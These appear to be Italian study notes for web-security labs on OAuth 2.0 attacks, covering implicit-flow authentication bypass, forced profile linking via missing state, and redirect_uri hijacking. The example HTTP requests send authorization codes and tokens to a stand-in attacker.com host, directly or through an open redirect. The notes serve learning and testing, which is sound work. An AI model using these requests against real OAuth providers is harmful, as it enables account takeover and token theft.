# OAuth 2.0 – Schema attacchi comuni (con esempi)

## 1. Concetti base OAuth (ripasso veloce)

- **Attori principali**:  
  - Client: l’app che vuole accedere ai dati (es. `blog-client.com`).  
  - Resource owner: l’utente (es. “Wiener”).  
  - OAuth provider: social / IdP (es. `oauth-authorization-server.com`).  
- Endpoints tipici:  
  - `/authorization` (o `/auth`) – inizio flow.  
  - `/token` – scambio code → access token.  
  - `/userinfo` – dati utente (username/email).  

***

## 2. Authorization Code Flow (SSO “classico”)

### 2.1 Sequenza “pulita”

1. **Richiesta di autorizzazione** (browser → OAuth):  

```http
GET /auth?
    client_id=blog-client&
    redirect_uri=https://blog-client.com/oauth-callback&
    response_type=code&
    scope=openid%20profile%20email&
    state=abc123xyz
Host: oauth-authorization-server.com
```

2. **Login e consenso utente** sul sito OAuth (social).  
3. **Redirect con authorization code** (browser → client):  

```http
GET /oauth-callback?code=AUTH_CODE_123&state=abc123xyz HTTP/1.1
Host: blog-client.com
```

4. **Scambio code ↔ token** (server‑to‑server, invisibile al browser):  

```http
POST /token HTTP/1.1
Host: oauth-authorization-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=AUTH_CODE_123&
redirect_uri=https://blog-client.com/oauth-callback&
client_id=blog-client&
client_secret=TOP_SECRET
```

5. **Risposta con access token**:  

```json
{
  "access_token": "ACCESS_TOKEN_ABC",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid profile email"
}
```

6. **Richiesta /userinfo**:  

```http
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer ACCESS_TOKEN_ABC
```

***

## 3. Implicit Flow (più semplice, meno sicuro)

### 3.1 Sequenza “pulita”

1. **Richiesta di autorizzazione** (nota `response_type=token`):  

```http
GET /auth?
    client_id=blog-client&
    redirect_uri=https://blog-client.com/oauth-callback&
    response_type=token&
    scope=openid%20profile%20email&
    state=xyz789
Host: oauth-authorization-server.com
```

2. **Login + consenso** come prima.  
3. **Redirect con access token nel fragment**:  

```http
GET /oauth-callback#
    access_token=ACCESS_TOKEN_ABC&
    token_type=Bearer&
    expires_in=3600&
    scope=openid%20profile%20email&
    state=xyz789
Host: blog-client.com
```

4. **JS del client estrae il fragment**, manda i dati al server con una POST (tipico pattern vulnerabile).  

Esempio richiesta finale che vedi in Burp:

```http
POST /authenticate HTTP/1.1
Host: blog-client.com
Content-Type: application/x-www-form-urlencoded

access_token=ACCESS_TOKEN_ABC&
username=wiener&
email=wiener@normal-user.net
```

***

## 4. Vulnerabilità lato client – Implicit Flow mal implementato

### 4.1 Idea dell’attacco

Se il server **non verifica che l’email/username in POST corrispondano davvero al token**, puoi cambiare questi campi e impersonare altri utenti.

**Appunti per lab**: Authentication bypass via OAuth implicit flow (APPRENTICE)

***

## 5. Vulnerabilità CSRF – Mancanza di `state` (Forced OAuth profile linking)

### 5.1 Scenario

- Applicazione permette:  
  - Login normale (username/password).  
  - **Collegare un profilo social** via OAuth per SSO.  
- Flow di linking usa Authorization Code, ma **senza `state`**.

Richiesta di autorizzazione per il linking:

```http
GET /auth?
    client_id=blog-client&
    redirect_uri=https://blog-client.com/oauth-linking&
    response_type=code&
    scope=openid%20profile%20email
Host: oauth-authorization-server.com
```

### 5.2 Idea dell’attacco

- Tu avvii il linking dal tuo account, intercetti l’ultimo `GET /oauth-linking?code=...` e lo **droppi**.  
- Riutilizzi la stessa richiesta come payload CSRF su admin: quando admin visita la tua pagina, il suo browser completa il linking **tra il suo account e il tuo profilo social**.

**Appunti per lab**: Forced OAuth profile linking (PRACTITIONER)

***

## 6. Vulnerabilità lato provider – redirect_uri e furto di code/token

### 6.1 redirect_uri non validato (Account hijacking via redirect_uri)

Se il provider accetta un `redirect_uri` arbitrario, puoi far mandare l’authorization code ad un tuo dominio.

Richiesta di autorizzazione malevola (da usare nel tuo exploit):

```http
GET /auth?
    client_id=blog-client&
    redirect_uri=https://attacker.com/oauth-callback&
    response_type=code&
    scope=openid%20profile%20email
Host: oauth-authorization-server.com
```

**Appunti per lab**: OAuth account hijacking via redirect_uri (PRACTITIONER)

### 6.2 Uso del code rubato

Ora puoi usare quel `code` verso il vero client:

```http
GET /oauth-callback?code=VICTIM_CODE HTTP/1.1
Host: blog-client.com
```

***

## 7. redirect_uri “quasi sicuro” → uso di proxy / open redirect

Quando il provider restringe il dominio, prova a puntare il `redirect_uri` a pagine vulnerabili sul **dominio legittimo**:

- Open redirect: `https://blog-client.com/open-redirect?next=https://attacker.com/capture`  
- Path traversal su callback:  
  - `https://blog-client.com/oauth/callback/../../open-redirect?next=https://attacker.com/capture`  

Idea:  

1. `redirect_uri` → pagina con open redirect / XSS / JS pericoloso.  
2. Quella pagina **legge query/fragment** (code o token) e lo gira al tuo server (es. via `fetch()` o `img`/`script`).

**Appunti per lab**: Stealing OAuth access tokens via an open redirect (PRACTITIONER)

***

## 8. Checklist pratica per il lab (cosa guardare in Burp)

- Vedi `/auth` o `/authorization` con: `client_id`, `redirect_uri`, `response_type`, `scope`, `state`?  
- Flow:  
  - `response_type=code` → Authorization Code.  
  - `response_type=token` → Implicit.  
- `state` presente? Se manca: pensa a **CSRF / forced linking / login CSRF**.  
- C’è una POST finale al client tipo `/authenticate` con `access_token`, `email`, `username`? Prova a **modificare i dati utente** mantenendo lo stesso token.  
- `redirect_uri` è modificabile?  
  - Testa domini esterni → account hijacking diretto.  
  - Se non passa, prova sottopercorsi, open redirect, XSS sul dominio whitelisted.
